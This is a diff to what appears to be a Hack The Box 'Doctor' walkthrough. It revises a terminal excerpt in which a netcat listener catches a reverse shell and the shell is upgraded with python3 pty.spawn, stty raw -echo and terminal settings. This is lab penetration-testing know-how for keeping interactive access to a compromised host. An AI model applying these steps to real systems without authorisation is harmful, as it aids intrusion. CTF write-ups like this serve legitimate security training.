@@ -149,15 +149,31 @@ After obtaining the reverse shell, we will have to stabilize the shell
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ nc -nlvp 3000       
+└─$ exec bash --login
+┏━(Message from Kali developers)
+┃
+┃ We have kept /usr/bin/python pointing to Python 2 for backwards
+┃ compatibility. Learn how to change this and avoid this message:
+┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000
 listening on [any] 3000 ...
-connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42332
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42614
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-web@doctor:~$ export TERM=xterm
-export TERM=xterm
+web@doctor:~$ ^Z
+[1]+  Stopped                 nc -nlvp 3000
+
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo
+
+┌──(kali㉿kali)-[~]
+nc -nlvp 3000
+             export TERM=xterm
 web@doctor:~$ stty cols 132 rows 34
-stty cols 132 rows 34
 web@doctor:~$ 
+
 ```
 
 ### Privilege Escalation to shaun
